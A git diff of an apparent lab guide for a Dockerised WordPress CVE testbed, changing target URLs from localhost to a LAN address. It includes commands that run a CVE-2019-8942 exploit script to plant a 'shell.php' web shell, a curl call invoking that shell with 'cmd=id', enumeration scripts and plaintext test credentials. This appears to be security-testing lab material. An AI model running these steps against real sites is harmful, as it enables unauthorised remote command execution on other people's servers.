@@ -30,7 +30,7 @@ docker compose up -d
 # Wait for setup
 sleep 60
 ```
-- URL: http://localhost:18180
+- URL: http://192.168.4.36:18180
 - Admin: admin / AdminPass123!
 - Author: author / AuthorPass123!
 
@@ -62,9 +62,9 @@ run
 ```bash
 cd ~/wp-cve-all/exploits/cve-2019-8942
 # Use provided polyglot
-./scripts/manual_exploit.sh http://localhost:18180 author AuthorPass123! shell.php
+./scripts/manual_exploit.sh http://192.168.4.36:18180 author AuthorPass123! shell.php
 # Access shell
-curl "http://localhost:18180/wp-content/themes/twentynineteen/shell.php?cmd=id"
+curl "http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell.php?cmd=id"
 ```
 
 #### Manual Steps (Detailed)
@@ -280,9 +280,9 @@ Similar to 21662, requires gadget chains. Can be exploited via term queries if u
 ### Enumeration
 ```bash
 cd ~/wp-cve-all
-./enumerate.sh http://localhost:18180
+./enumerate.sh http://192.168.4.36:18180
 # or
-./scripts/enumerate.sh http://localhost:18180
+./scripts/enumerate.sh http://192.168.4.36:18180
 ```
 
 ### Check version
